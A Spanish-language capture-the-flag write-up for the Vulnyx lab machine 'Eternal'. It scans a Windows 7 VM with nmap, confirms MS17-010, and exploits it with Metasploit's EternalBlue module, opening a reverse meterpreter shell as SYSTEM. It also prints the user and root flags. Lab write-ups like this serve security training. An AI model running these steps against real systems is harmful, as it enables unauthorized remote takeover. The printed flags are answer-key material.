---
icon: flag
---

# Eternal Vulnyx (Very Easy- Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 03:31 EDT
Nmap scan report for 192.168.5.66
Host is up (0.0047s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:0B:D9:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 19m58s, deviation: 1h09m16s, median: 59m58s
| smb2-time: 
|   date: 2025-07-25T08:32:01
|_  start_date: 2025-07-25T08:30:20
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0b:d9:5e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-25T10:32:01+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.55 seconds
```

Veremos varios puertos interesantes, pero entre ellos veremos un `SAMBA` abierto, tambien sabemos que es un `Windows 7` por lo que podremos de deducir que puede ser vulnerable a `Eternal Blue` por lo que vamos a utilizar un `script` de `nmap` para poder identificarlo.

```shell
nmap -p445 --script=smb-vuln-ms17-010 <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 03:35 EDT
Nmap scan report for 192.168.5.66
Host is up (0.0016s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:0B:D9:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

## Metasploit

```shell
msfconsole -q
```

Una vez que estemos dentro, vamos a buscar el siguiente modulo (`exploit`) para aprovechar dicha vulnerabilidad.

```shell
use exploit/windows/smb/ms17_010_eternalblue
```

Ahora dentro de dicho modulo, vamos a configurarlo de la siguiente forma:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.50:7777 
[*] 192.168.5.66:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.5.66:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.5.66:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.5.66:445 - The target is vulnerable.
[*] 192.168.5.66:445 - Connecting to target for exploitation.
[+] 192.168.5.66:445 - Connection established for exploitation.
[+] 192.168.5.66:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.5.66:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.5.66:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 192.168.5.66:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 192.168.5.66:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.5.66:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.5.66:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.5.66:445 - Sending all but last fragment of exploit packet
[*] 192.168.5.66:445 - Starting non-paged pool grooming
[+] 192.168.5.66:445 - Sending SMBv2 buffers
[+] 192.168.5.66:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.5.66:445 - Sending final SMBv2 buffers.
[*] 192.168.5.66:445 - Sending last fragment of exploit packet!
[*] 192.168.5.66:445 - Receiving response from exploit packet
[+] 192.168.5.66:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.5.66:445 - Sending egg to corrupted connection.
[*] 192.168.5.66:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.5.66
[*] Meterpreter session 1 opened (192.168.5.50:7777 -> 192.168.5.66:49158) at 2025-07-25 03:39:14 -0400
[+] 192.168.5.66:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.66:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.66:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Veremos que ha funcionado, por lo que vamos a leer las `flags` del usuario y de `root`.

> user.txt

```
c4fa8bfbc9855acfced6a56a7da3156e
```

> root.txt

```
1682c7160e3855a6685316efb97ce451
```
